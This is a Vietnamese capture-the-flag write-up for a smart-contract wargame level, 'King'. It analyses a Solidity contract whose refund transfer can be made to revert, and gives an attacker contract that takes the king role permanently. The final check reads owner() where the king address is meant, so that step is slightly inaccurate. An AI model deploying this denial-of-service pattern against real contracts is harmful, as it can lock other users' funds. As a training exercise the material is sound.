# Level 9: King
##  ★★★☆☆
## Given contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```
## Phân tích
- Trong contract, với nhiệm vụ là chiếm quyền king vĩnh viễn, nhưng khi ta nhìn vào fallback function ở đây, khi có ai đó send transaction thì king sẽ thay đổi owner ``king=msg.sender`` và contract sẽ tranfer ngược lại value đó.
```solidity
  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
 
```
- Mấu chốt ở đây là ta cần làm hàm fallback function này luôn bị revert(),vì transaction sẽ bị chuyển ngược lại ``king`` nên ta cần viết một contract mà không có fallback function để receive-> thế là transaction luôn bị revert()


## Solution
**Target**: Chiếm quyền King vĩnh viễn và không cho ai chiếm quyền của mình nữa.
- Check prize hiện tại và thấy prize là 1000000000000000000 wei hay 1 ether
```javascript
await contract.prize().then(x => x.toString());
> 1000000000000000000

```

- Compile và deploy contract này trên remix, sau đó gọi hàm ``claimKingship()`` và send value 1 ether để đáp ứng ``require``:  

- Vì prize là 1 ether nên ta sẽ cần send 1 ether
```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.7.3;



contract ForeverKing {
    function claimKingship(address payable _to) public payable {
        (bool sent, ) = _to.call{value: msg.value}("");
        require(sent, "Failed to send value!");
    }
}
```

- Check lại owner và thử send transaction lại để check owner có bị thay đổi không -> nếu owner không thay đổi thì bạn đã hoàn thành challenge này =))
```javascript
await contract.owner()

```
**Submit** -> Done



